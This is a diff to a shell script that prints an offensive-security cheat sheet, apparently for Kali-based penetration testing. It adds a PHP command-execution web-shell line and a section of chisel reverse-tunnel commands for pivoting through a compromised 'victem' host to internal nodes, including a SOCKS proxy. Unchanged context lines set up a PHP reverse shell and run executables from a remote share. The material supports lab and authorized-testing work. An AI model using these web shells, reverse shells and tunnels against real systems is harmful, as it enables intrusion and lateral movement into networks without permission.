@@ -23,6 +23,7 @@ echo -e "?>"
 echo -e ""
 echo -e "${Point} PHP command execution script"
 echo -e "<?php passthru('id'); ?>"
+echo -e "<?php system('id'); ?>"
 echo -e ""
 echo -e "${Point} PHP reverse shell"
 echo -e "cp /usr/share/webshells/php/php-reverse-shell.php ."
@@ -39,8 +40,12 @@ echo -e "    \\\\\\$ip\\\share\\\file.exe ${Comment}# run executable${End}"
 echo -e ""
 
 
-echo -e "${Frame}###${End} ${Title}Fire up server${End} ${Frame}###${End}"
-
+echo -e "${Frame}###${End} ${Title}Port Tunneling${End} ${Frame}###${End}"
+echo -e "${Point} chisel server -p 10000 --reverse"
+echo -e "    chisel client \$server_ip:10000 R:\$port:127.0.0.1:\$port ${Comment}# forward localhost \$port on client to server (kali_\$port <---> victem_\$port)${End}"
+echo -e "    chisel client \$server_ip:10000 R:\$port:\$internal_node:\$port ${Comment}# forward internal node \$port on client to server (kali_\$port <--victem--> internal_node_\$port)${End}"
+echo -e "    chisel client \$server_ip:10000 R:socks ${Comment}# forward traffics on client to server through proxy (kali <--victem--> internal_domain)${End}"
+echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Linux Post Enum${End} ${Frame}###${End}"
